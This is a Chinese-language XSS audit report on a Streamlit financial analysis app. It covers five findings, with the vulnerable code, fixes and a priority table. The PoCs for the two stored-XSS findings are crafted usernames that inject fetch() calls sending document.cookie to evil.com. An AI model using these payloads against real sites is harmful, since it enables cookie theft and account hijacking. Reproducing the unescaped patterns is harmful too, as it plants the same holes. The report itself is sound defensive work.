# XSS 安全测试报告

**测试日期**: 2026-06-22  
**测试目标**: 金融数据分析系统 (Streamlit v1.57.0)  
**测试方法**: 代码审计 + 数据库注入 + 渲染逻辑模拟

---

## 漏洞总览

| # | 严重度 | 类型 | 位置 | 描述 |
|---|--------|------|------|------|
| 1 | 🔴 CRITICAL | 存储型 XSS | `app.py:133` | JS 注入 via `st.components.v1.html()` |
| 2 | 🔴 HIGH | 存储型 XSS | `pages/5/line 378` | HTML 属性注入 via `st.markdown(unsafe_allow_html=True)` |
| 3 | 🟡 MEDIUM | 输入过滤缺失 | `app.py:164-207` | 注册/编辑时未过滤 XSS 字符 |
| 4 | 🟡 MEDIUM | 存储型 XSS | `pages/6/line 78-98` | 管理员编辑用户名传播恶意 payload |
| 5 | 🟢 LOW | 反射型 XSS | `pages/5/line 170` | recover_user 参数反射 |

---

## 🔴 VULN 1: 存储型 JS 注入 (CRITICAL)

**文件**: `app.py` 第 133-139 行  
**向量**: 注册用户名 → 登录 → `st.components.v1.html()` 内联 JS  
**利用条件**: 无需管理员权限，任何注册用户均可触发

### 漏洞代码

```python
# app.py line 133-139
st.session_state["username"] = username  # 来自数据库
st.components.v1.html(f"""
<script>
localStorage.setItem('fa_username', '{username}');   # ← 未转义！
localStorage.setItem('fa_logged_in', '1');
localStorage.setItem('fa_timestamp', Date.now().toString());
</script>
""", height=0)
```

### PoC

**Step 1**: 注册用户名 `x');fetch('https://evil.com/steal?c='+document.cookie);//`

**Step 2**: 登录后浏览器收到:

```javascript
<script>
localStorage.setItem('fa_username', 'x');fetch('https://evil.com/steal?c='+document.cookie);//');
localStorage.setItem('fa_logged_in', '1');
localStorage.setItem('fa_timestamp', Date.now().toString());
</script>
```

**Step 3**: `fetch()` 执行，窃取 cookie 发送到 evil.com

### 影响

- `st.components.v1.html()` 使用 `srcdoc` iframe，**同源**，可访问 `parent.document`
- 每次登录自动触发（无需用户交互）
- 可执行的攻击:
  - 窃取 `document.cookie`、`localStorage`
  - 修改页面 DOM（钓鱼表单）
  - 劫持用户操作（转账、修改持仓）
  - 重定向到恶意站点

### 修复建议

```python
# 方案 1: 使用 json.dumps 安全地序列化用户名
import json
username_escaped = json.dumps(username)  # 自动转义 ' " \ 等

st.components.v1.html(f"""
<script>
localStorage.setItem('fa_username', {username_escaped});
...
</script>
""", height=0)

# 方案 2: 使用 html.escape + 前端 JS 读取
import html
username_safe = html.escape(username)
# 然后在前端用 textContent 而非 innerHTML
```

---

## 🔴 VULN 2: HTML 属性注入 (HIGH)

**文件**: `pages/5_🎮_游戏中心.py` 第 368-402 行  
**向量**: 用户名 → `st.markdown(..., unsafe_allow_html=True)` → `<a href>` 属性

### 漏洞代码

```python
# pages/5_🎮_游戏中心.py line 378
st.markdown(f"""
<div ...>
    ...
    <a href="/app/static/snake_game.html?username={username}" ...
""", unsafe_allow_html=True)
```

### PoC

用户名: `" onclick="fetch('https://evil.com/steal?c='+document.cookie)" foo="`

渲染结果:
```html
<a href="/app/static/snake_game.html?username=" 
   onclick="fetch('https://evil.com/steal?c='+document.cookie)" 
   foo="" target="_blank" ...>Start Game</a>
```

### 影响

- Streamlit 前端使用 DOMPurify 做 HTML 净化，**默认会剥离 onclick**
- 但如果 DOMPurify 配置不当或存在 bypass，onclick 将执行
- 即使 onclick 被剥离，`"` 仍会破坏 HTML 结构，导致链接失效
- 这是 Streamlit 的**渲染链**中最薄弱的一环

### 修复建议

```python
import html
username_safe = html.escape(username)
# 或改用 url encode
from urllib.parse import quote
username_safe = quote(username)
```

---

## 🟡 VULN 3: 注册端输入过滤缺失 (MEDIUM)

**文件**: `app.py` 第 164-207 行

### 当前验证

```python
if len(reg_user) < 2 or len(reg_user) > 20:  # 长度
if " " in reg_user:                            # 空格
# ✗ 无 HTML/JS 字符过滤
```

### 建议增加

```python
import re

# 只允许中文、字母、数字、下划线
if not re.match(r'^[\w一-鿿]+$', reg_user):
    st.warning("用户名只能包含中文、字母、数字和下划线")
```

---

## 🟡 VULN 4: 管理员编辑传播 XSS (MEDIUM)

**文件**: `pages/6_🔧_管理员后台.py` 第 78-98 行

管理员可修改任意用户的用户名，如果没有过滤（当前没有），攻击链:
1. 管理员账户被盗 / 恶意管理员
2. 修改其他用户名为 XSS payload
3. 该用户登录时触发 VULN 1

**修复**: 在 `update_user()` 和 `add_user()` 中加入与注册端一致的输入验证。

---

## 🟢 VULN 5: 反射型 recover_user (LOW)

**文件**: `pages/5_🎮_游戏中心.py` 第 170 行

```python
recover_user = st.query_params.get("recover_user")
st.info(f"欢迎回来，**{recover_user}**！")  # st.info() 默认 escape HTML
```

`st.info()` 使用 Streamlit 默认 markdown 渲染（`unsafe_allow_html=False`），HTML 被转义。

**注意**: 这不意味着 `recover_user` 完全安全。它在第 189 行被直接用于 SQL 查询:
```python
cur.execute("SELECT id, is_admin FROM users WHERE username = %s", (recover_user,))
```
这里使用了参数化查询 `%s`，所以 SQL 注入被正确防御。✅

---

## 修复优先级

| 优先级 | 漏洞 | 修复工作量 | 操作 |
|--------|------|-----------|------|
| **P0** | VULN 1 | 1 行 | `app.py:133` 对 username 做 JS 转义 |
| **P1** | VULN 3 | 3 行 | 注册/编辑时增加字符白名单 |
| **P2** | VULN 2 | 2 行 | `pages/5` 对 username 做 HTML 转义 |
| **P3** | VULN 4 | 复用 VULN 3 | 管理员页面复用注册验证逻辑 |

---

## 测试数据清理

测试期间创建的 6 个 XSS 测试用户已从数据库删除。`_xss_test.py` 和 `_xss_verify.py` 和 `_xss_poc.py` 为临时测试脚本，可删除。
